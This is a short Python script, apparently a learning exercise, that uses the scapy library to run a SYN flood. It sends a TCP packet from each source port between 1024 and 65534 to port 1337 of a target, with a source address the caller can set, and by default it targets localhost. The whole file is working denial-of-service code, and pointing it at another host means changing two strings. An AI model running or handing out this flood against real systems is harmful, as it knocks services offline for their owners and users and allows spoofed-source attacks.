
from scapy.all import *
from scapy.layers.inet import TCP, IP

def synFlood(src, tgt):
    for sport in range(1024, 65535):
        L3 = IP(src=src, dst=tgt)
        L4 = TCP(sport=sport, dport=1337)
        pkt = L3 / L4
        send(pkt)


src = "localhost"
tgt = "localhost"
synFlood(src, tgt)
